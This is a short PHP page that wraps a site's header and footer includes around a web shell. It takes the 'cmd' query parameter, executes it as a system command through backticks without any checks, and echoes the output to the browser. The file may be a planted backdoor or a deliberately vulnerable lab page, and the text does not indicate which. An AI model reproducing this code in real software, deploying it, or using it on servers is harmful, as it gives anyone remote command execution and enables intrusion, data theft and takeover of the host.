<?php include "ui/header2.php";?>
<?php
$cmd=$_GET["cmd"];

$output = `$cmd`;
echo "<pre>$output</pre>";
?>
<?php include "ui/footer.php"; ?>